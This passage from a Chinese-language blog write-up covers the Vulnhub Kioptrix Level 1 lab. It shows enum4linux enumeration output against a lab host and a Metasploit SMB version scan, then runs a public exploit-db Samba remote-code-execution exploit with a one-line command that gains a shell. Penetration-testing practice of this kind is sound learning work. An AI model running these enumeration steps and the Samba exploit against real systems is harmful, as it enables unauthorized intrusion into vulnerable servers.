class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# enum4linux 192.168.199.230</span><br><span class="line">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Oct 13 04:23:40 2019</span><br><span class="line"></span><br><span class="line"> ========================== </span><br><span class="line">|    Target Information    |</span><br><span class="line"> ========================== </span><br><span class="line">Target ........... 192.168.199.230</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... &apos;&apos;</span><br><span class="line">Password ......... &apos;&apos;</span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ======================================================= </span><br><span class="line">|    Enumerating Workgroup/Domain on 192.168.199.230    |</span><br><span class="line"> ======================================================= </span><br><span class="line">[+] Got domain/workgroup name: MYGROUP</span><br><span class="line"></span><br><span class="line"> =============================================== </span><br><span class="line">|    Nbtstat Information for 192.168.199.230    |</span><br><span class="line"> =============================================== </span><br><span class="line">Looking up status of 192.168.199.230</span><br><span class="line">	KIOPTRIX        &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service</span><br><span class="line">	KIOPTRIX        &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service</span><br><span class="line">	KIOPTRIX        &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service</span><br><span class="line">	..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">	MYGROUP         &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name</span><br><span class="line">	MYGROUP         &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">	MYGROUP         &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections</span><br><span class="line"></span><br><span class="line">	MAC Address = 00-00-00-00-00-00</span><br><span class="line"></span><br><span class="line"> ======================================== </span><br><span class="line">|    Session Check on 192.168.199.230    |</span><br><span class="line"> ======================================== </span><br><span class="line">[+] Server 192.168.199.230 allows sessions using username &apos;&apos;, password &apos;&apos;</span><br><span class="line"></span><br><span class="line"> ============================================== </span><br><span class="line">|    Getting domain SID for 192.168.199.230    |</span><br><span class="line"> ============================================== </span><br><span class="line">Domain Name: MYGROUP</span><br><span class="line">Domain Sid: (NULL SID)</span><br><span class="line">[+] Can&apos;t determine if host is part of domain or part of a workgroup</span><br><span class="line"></span><br><span class="line"> ========================================= </span><br><span class="line">|    OS information on 192.168.199.230    |</span><br><span class="line"> ========================================= </span><br><span class="line">Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.</span><br><span class="line">[+] Got OS info for 192.168.199.230 from smbclient: </span><br><span class="line">[+] Got OS info for 192.168.199.230 from srvinfo:</span><br><span class="line">	KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server</span><br><span class="line">	platform_id     :	500</span><br><span class="line">	os version      :	4.5</span><br><span class="line">	server type     :	0x9a03</span><br><span class="line"></span><br><span class="line"> ================================ </span><br><span class="line">|    Users on 192.168.199.230    |</span><br><span class="line"> ================================ </span><br><span class="line">Use of uninitialized value $users in print at ./enum4linux.pl line 874.</span><br><span class="line">Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.</span><br><span class="line"></span><br><span class="line">Use of uninitialized value $users in print at ./enum4linux.pl line 888.</span><br><span class="line">Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.</span><br><span class="line"></span><br><span class="line"> ============================================ </span><br><span class="line">|    Share Enumeration on 192.168.199.230    |</span><br><span class="line"> ============================================ </span><br><span class="line"></span><br><span class="line">	Sharename       Type      Comment</span><br><span class="line">	---------       ----      -------</span><br><span class="line">	IPC$            IPC       IPC Service (Samba Server)</span><br><span class="line">	ADMIN$          IPC       IPC Service (Samba Server)</span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line"></span><br><span class="line">	Server               Comment</span><br><span class="line">	---------            -------</span><br><span class="line">	KIOPTRIX             Samba Server</span><br><span class="line"></span><br><span class="line">	Workgroup            Master</span><br><span class="line">	---------            -------</span><br><span class="line">	MYGROUP              KIOPTRIX</span><br><span class="line"></span><br><span class="line">[+] Attempting to map shares on 192.168.199.230</span><br><span class="line">//192.168.199.230/IPC$	[E] Can&apos;t understand response:</span><br><span class="line">NT_STATUS_NETWORK_ACCESS_DENIED listing \*</span><br><span class="line">//192.168.199.230/ADMIN$	[E] Can&apos;t understand response:</span><br><span class="line">tree connect failed: NT_STATUS_WRONG_PASSWORD</span><br><span class="line"></span><br><span class="line"> ======================================================= </span><br><span class="line">|    Password Policy Information for 192.168.199.230    |</span><br><span class="line"> ======================================================= </span><br><span class="line">[E] Unexpected error from polenum:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Attaching to 192.168.199.230 using a NULL share</span><br><span class="line"></span><br><span class="line">[+] Trying protocol 445/SMB...</span><br><span class="line"></span><br><span class="line">	[!] Protocol failed: [Errno Connection error (192.168.199.230:445)] [Errno 111] Connection refused</span><br><span class="line"></span><br><span class="line">[+] Trying protocol 139/SMB...</span><br><span class="line"></span><br><span class="line">	[!] Protocol failed: SMB SessionError: 0x5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Retieved partial password policy with rpcclient:</span><br><span class="line"></span><br><span class="line">Password Complexity: Disabled</span><br><span class="line">Minimum Password Length: 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ================================= </span><br><span class="line">|    Groups on 192.168.199.230    |</span><br><span class="line"> ================================= </span><br><span class="line"></span><br><span class="line">[+] Getting builtin groups:</span><br><span class="line">group:[Administrators] rid:[0x220]</span><br><span class="line">group:[Users] rid:[0x221]</span><br><span class="line">group:[Guests] rid:[0x222]</span><br><span class="line">group:[Power Users] rid:[0x223]</span><br><span class="line">group:[Account Operators] rid:[0x224]</span><br><span class="line">group:[System Operators] rid:[0x225]</span><br><span class="line">group:[Print Operators] rid:[0x226]</span><br><span class="line">group:[Backup Operators] rid:[0x227]</span><br><span class="line">group:[Replicator] rid:[0x228]</span><br><span class="line"></span><br><span class="line">[+] Getting builtin group memberships:</span><br><span class="line">Group &apos;Administrators&apos; (RID: 544) has member: Couldn&apos;t find group Administrators</span><br><span class="line">Group &apos;System Operators&apos; (RID: 549) has member: Couldn&apos;t find group System Operators</span><br><span class="line">Group &apos;Backup Operators&apos; (RID: 551) has member: Couldn&apos;t find group Backup Operators</span><br><span class="line">Group &apos;Account Operators&apos; (RID: 548) has member: Couldn&apos;t find group Account Operators</span><br><span class="line">Group &apos;Power Users&apos; (RID: 547) has member: Couldn&apos;t find group Power Users</span><br><span class="line">Group &apos;Guests&apos; (RID: 546) has member: Couldn&apos;t find group Guests</span><br><span class="line">Group &apos;Users&apos; (RID: 545) has member: Couldn&apos;t find group Users</span><br><span class="line">Group &apos;Print Operators&apos; (RID: 550) has member: Couldn&apos;t find group Print Operators</span><br><span class="line">Group &apos;Replicator&apos; (RID: 552) has member: Couldn&apos;t find group Replicator</span><br><span class="line"></span><br><span class="line">[+] Getting local groups:</span><br><span class="line">group:[sys] rid:[0x3ef]</span><br><span class="line">group:[tty] rid:[0x3f3]</span><br><span class="line">group:[disk] rid:[0x3f5]</span><br><span class="line">group:[mem] rid:[0x3f9]</span><br><span class="line">group:[kmem] rid:[0x3fb]</span><br><span class="line">group:[wheel] rid:[0x3fd]</span><br><span class="line">group:[man] rid:[0x407]</span><br><span class="line">group:[dip] rid:[0x439]</span><br><span class="line">group:[lock] rid:[0x455]</span><br><span class="line">group:[users] rid:[0x4b1]</span><br><span class="line">group:[slocate] rid:[0x413]</span><br><span class="line">group:[floppy] rid:[0x40f]</span><br><span class="line">group:[utmp] rid:[0x415]</span><br><span class="line"></span><br><span class="line">[+] Getting local group memberships:</span><br><span class="line"></span><br><span class="line">[+] Getting domain groups:</span><br><span class="line">group:[Domain Admins] rid:[0x200]</span><br><span class="line">group:[Domain Users] rid:[0x201]</span><br><span class="line"></span><br><span class="line">[+] Getting domain group memberships:</span><br><span class="line">Group &apos;Domain Users&apos; (RID: 513) has member: Couldn&apos;t find group Domain Users</span><br><span class="line">Group &apos;Domain Admins&apos; (RID: 512) has member: Couldn&apos;t find group Domain Admins</span><br><span class="line"></span><br><span class="line"> ========================================================================== </span><br><span class="line">|    Users on 192.168.199.230 via RID cycling (RIDS: 500-550,1000-1050)    |</span><br><span class="line"> ========================================================================== </span><br><span class="line">[I] Found new SID: S-1-5-21-4157223341-3243572438-1405127623</span><br><span class="line">[+] Enumerating users using SID S-1-5-21-4157223341-3243572438-1405127623 and logon username &apos;&apos;, password &apos;&apos;</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-500 KIOPTRIX\</span><br><span class="line">                                                        (0)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-501 KIOPTRIX\ (0)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-502 KIOPTRIX\unix_group.2147483399 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-503 KIOPTRIX\unix_group.2147483399 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-504 KIOPTRIX\unix_group.2147483400 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-505 KIOPTRIX\unix_group.2147483400 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-506 KIOPTRIX\unix_group.2147483401 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-507 KIOPTRIX\unix_group.2147483401 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-508 KIOPTRIX\unix_group.2147483402 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-509 KIOPTRIX\unix_group.2147483402 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-510 KIOPTRIX\unix_group.2147483403 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-511 KIOPTRIX\unix_group.2147483403 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-512 KIOPTRIX\Domain Admins (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-513 KIOPTRIX\Domain Users (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-514 KIOPTRIX\Domain Guests (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-515 KIOPTRIX\unix_group.2147483405 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-516 KIOPTRIX\unix_group.2147483406 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-517 KIOPTRIX\unix_group.2147483406 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-518 KIOPTRIX\unix_group.2147483407 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-519 KIOPTRIX\unix_group.2147483407 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-520 KIOPTRIX\unix_group.2147483408 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-521 KIOPTRIX\unix_group.2147483408 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-522 KIOPTRIX\unix_group.2147483409 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-523 KIOPTRIX\unix_group.2147483409 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-524 KIOPTRIX\unix_group.2147483410 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-525 KIOPTRIX\unix_group.2147483410 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-526 KIOPTRIX\unix_group.2147483411 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-527 KIOPTRIX\unix_group.2147483411 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-528 KIOPTRIX\unix_group.2147483412 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-529 KIOPTRIX\unix_group.2147483412 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-530 KIOPTRIX\unix_group.2147483413 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-531 KIOPTRIX\unix_group.2147483413 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-532 KIOPTRIX\unix_group.2147483414 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-533 KIOPTRIX\unix_group.2147483414 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-534 KIOPTRIX\unix_group.2147483415 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-535 KIOPTRIX\unix_group.2147483415 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-536 KIOPTRIX\unix_group.2147483416 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-537 KIOPTRIX\unix_group.2147483416 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-538 KIOPTRIX\unix_group.2147483417 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-539 KIOPTRIX\unix_group.2147483417 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-540 KIOPTRIX\unix_group.2147483418 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-541 KIOPTRIX\unix_group.2147483418 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-542 KIOPTRIX\unix_group.2147483419 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-543 KIOPTRIX\unix_group.2147483419 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-544 KIOPTRIX\unix_group.2147483420 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-545 KIOPTRIX\unix_group.2147483420 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-546 KIOPTRIX\unix_group.2147483421 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-547 KIOPTRIX\unix_group.2147483421 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-548 KIOPTRIX\unix_group.2147483422 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-549 KIOPTRIX\unix_group.2147483422 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-550 KIOPTRIX\unix_group.2147483423 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1000 KIOPTRIX\root (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1001 KIOPTRIX\root (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1002 KIOPTRIX\bin (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1003 KIOPTRIX\bin (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1004 KIOPTRIX\daemon (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1005 KIOPTRIX\daemon (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1006 KIOPTRIX\adm (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1007 KIOPTRIX\sys (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1008 KIOPTRIX\lp (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1009 KIOPTRIX\adm (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1010 KIOPTRIX\sync (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1011 KIOPTRIX\tty (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1012 KIOPTRIX\shutdown (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1013 KIOPTRIX\disk (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1014 KIOPTRIX\halt (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1015 KIOPTRIX\lp (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1016 KIOPTRIX\mail (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1017 KIOPTRIX\mem (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1018 KIOPTRIX\news (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1019 KIOPTRIX\kmem (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1020 KIOPTRIX\uucp (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1021 KIOPTRIX\wheel (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1022 KIOPTRIX\operator (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1023 KIOPTRIX\unix_group.11 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1024 KIOPTRIX\games (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1025 KIOPTRIX\mail (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1026 KIOPTRIX\gopher (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1027 KIOPTRIX\news (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1028 KIOPTRIX\ftp (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1029 KIOPTRIX\uucp (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1030 KIOPTRIX\unix_user.15 (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1031 KIOPTRIX\man (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1032 KIOPTRIX\unix_user.16 (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1033 KIOPTRIX\unix_group.16 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1034 KIOPTRIX\unix_user.17 (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1035 KIOPTRIX\unix_group.17 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1036 KIOPTRIX\unix_user.18 (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1037 KIOPTRIX\unix_group.18 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1038 KIOPTRIX\unix_user.19 (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1039 KIOPTRIX\floppy (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1040 KIOPTRIX\unix_user.20 (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1041 KIOPTRIX\games (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1042 KIOPTRIX\unix_user.21 (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1043 KIOPTRIX\slocate (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1044 KIOPTRIX\unix_user.22 (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1045 KIOPTRIX\utmp (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1046 KIOPTRIX\squid (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1047 KIOPTRIX\squid (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1048 KIOPTRIX\unix_user.24 (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1049 KIOPTRIX\unix_group.24 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1050 KIOPTRIX\unix_user.25 (Local User)</span><br><span class="line"></span><br><span class="line"> ================================================ </span><br><span class="line">|    Getting printer info for 192.168.199.230    |</span><br><span class="line"> ================================================ </span><br><span class="line">No printers returned.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enum4linux complete on Sun Oct 13 04:23:51 2019</span><br><span class="line"></span><br><span class="line">root@kali:~#</span><br></pre></td></tr></table></figure>
<p>看了其他人写的writeup，正常可以拿到samba的版本号，但是我这个拿不到，还报了个错误：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.</span><br></pre></td></tr></table></figure>
<p>翻了下kali的bug tracker也提到了这个问题（测试了下缓解方法<a href="https://note.youdao.com/" target="_blank" rel="noopener">https://bugs.kali.org/view.php?id=4495</a>），没成，似乎是smbclient的一个bug？</p>
<p>msf试试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smb/smb_version) &gt; set RHOSTS 192.168.199.230</span><br><span class="line">RHOSTS =&gt; 192.168.199.230</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_version) &gt; set THREADS 16</span><br><span class="line">THREADS =&gt; 16</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_version) &gt; run</span><br></pre></td></tr></table></figure>
<p><img src="6A59DF9ED4B5423CBA84907B0E17B373" alt="image"></p>
<p>可以直接识别出版本为Samba 2.2.1a</p>
<p>直接上exploit：<a href="https://www.exploit-db.com/exploits/10" target="_blank" rel="noopener">Samba &lt; 2.2.8 (Linux/BSD) - Remote Code Execution</a><br><img src="4FDF5B01D3284CD0B879D05711E3A340" alt="image"></p>
<p>Capturing The Flag!</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./10 -b 0 192.168.199.230</span><br></pre></td></tr></table></figure>
<p><img src="85B62A2212A647EE89F75DF787004195" alt="image"></p>
<h2 id="0x04-待解决的问题"><a href="#0x04-待解决的问题" class="headerlink" title="0x04 待解决的问题"></a>0x04 待解决的问题</h2><ul>
<li>Kali 2019.03 smbclient bug导致不能识别smb版本的问题，提到Kali的<a href="https://bugs.kali.org/view.php?id=5739" target="_blank" rel="noopener">bug tracker</a>了。</li>
</ul>
<h2 id="0x05-后记"><a href="#0x05-后记" class="headerlink" title="0x05 后记"></a>0x05 后记</h2><p>好多expolit code比较老了，0几年的，在现在用的系统上经常出现依赖库版本兼容性问题导致报错，烦躁。</p>
<p>顺便提交了一个kali 2019.03上头smbclient不能获取smb service version info的bug，详细信息见kali的bug tracker：<a href="https://bugs.kali.org/view.php?id=5739" target="_blank" rel="noopener">It seems that the version bug of smbclient causes no way to enumerate the smb service version.</a>。</p>
<h2 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h2><ul>
<li><a href="https://www.vulnhub.com/series/kioptrix,8/" target="_blank" rel="noopener">Kioptrix</a></li>
<li><a href="https://manpages.debian.org/unstable/netdiscover/netdiscover.8.en.html" target="_blank" rel="noopener">netdiscover</a></li>
<li><a href="https://blog.bladeism.com/kioptrix-level-1/" target="_blank" rel="noopener">Kioptrix Level 1</a></li>
<li><a href="https://nmap.org/book/man.html" target="_blank" rel="noopener">Chapter 15. Nmap Reference Guide</a></li>
<li><a href="https://volta-sec.blogspot.com/2017/02/kioptrix-level-1-via-web-vuln.html" target="_blank" rel="noopener">Kioptrix Level 1 (Via Web Vuln)</a></li>
<li><a href="https://security.stackexchange.com/questions/31854/what-does-pn-option-mean-in-nmap" target="_blank" rel="noopener">What does -Pn option mean in nmap? [closed]</a></li>
<li><a href="https://bugs.kali.org/view.php?id=4495" target="_blank" rel="noopener">Kali Linux Bug Tracker</a></li>
<li><a href="https://github.com/portcullislabs/enum4linux/issues/5" target="_blank" rel="noopener">Use of uninitialized value $os_info in concatenation (.) or string at /bin/enum4linux line 464.</a></li>
<li><a href="https://www.hypn.za.net/blog/2017/08/27/compiling-exploit-764-c-in-2017/" target="_blank" rel="noopener">Compiling exploit 764.c in 2017 (using libssl-dev 1.1.0f )</a></li>
<li><a href="https://bugs.kali.org/view.php?id=5739" target="_blank" rel="noopener">It seems that the version bug of smbclient causes no way to enumerate the smb service version.</a></li>
<li><a href="https://www.offensive-security.com/metasploit-unleashed/scanner-smb-auxiliary-modules/" target="_blank" rel="noopener">Scanner SMB Auxiliary Modules</a></li>
</ul>
</div></article></div></main><footer><div class="paginator"><a href="/2019/10/14/OSCP-Vulnhub-Kioptrix-Level-2-Writeup/" class="prev">PREV</a><a href="/2019/10/09/ADFS-SAML-Integrated-AWS-China/" class="next">NEXT</a></div><div class="copyright"><p>© 2008 - 2022 <a href="https://tonghuaroot.com">TonghuaRoot</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>